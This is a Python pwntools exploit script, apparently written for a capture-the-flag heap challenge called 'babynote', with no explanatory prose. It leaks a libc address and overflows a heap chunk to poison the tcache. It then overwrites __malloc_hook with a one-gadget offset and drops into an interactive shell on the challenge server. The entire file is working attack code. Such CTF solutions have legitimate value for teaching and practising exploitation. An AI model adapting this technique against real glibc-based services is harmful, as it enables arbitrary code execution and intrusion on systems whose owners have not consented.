#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./babynote"

rhp1 = {'host':"babynote.ctf.jyoken.net",'port':80}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def hoge(conn,n):
  conn.recvuntil("> ")
  conn.sendline(str(n))

def _create(conn,content):
  hoge(conn,1)
  conn.recvuntil("Contents: ")
  conn.sendline(content)

def _show(conn,ix):
  hoge(conn,2)
  conn.recvuntil("Index: ")
  conn.sendline(str(ix))

def _delete(conn,ix):
  hoge(conn,3)
  conn.recvuntil("Index: ")
  conn.sendline(str(ix))

onegadgets = [0x4f2c5,0x4f322,0x10a38c]

def exploit(conn):
  conn.recvuntil("YOU: ")
  stdin_addr = int(conn.recvline().rstrip(),16)
  libcbase = stdin_addr - 0x3EBA00
  malloc_hook = libcbase + 0x3EBC30
  print("stdin: "+hex(stdin_addr))
  print("libcbase: "+hex(libcbase))
  print("malloc_hook: "+hex(malloc_hook))

  _create(conn,"A"*0x90)
  _create(conn,"B"*0x90)
  _create(conn,"C"*0x90)
  _delete(conn,2)
  _delete(conn,1)
  _delete(conn,0)
  _create(conn,"D"*0x90+p64(0)+p64(0xa1)+p64(malloc_hook))
  _create(conn,"E")
  _create(conn,p64(libcbase + onegadgets[2]))




if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

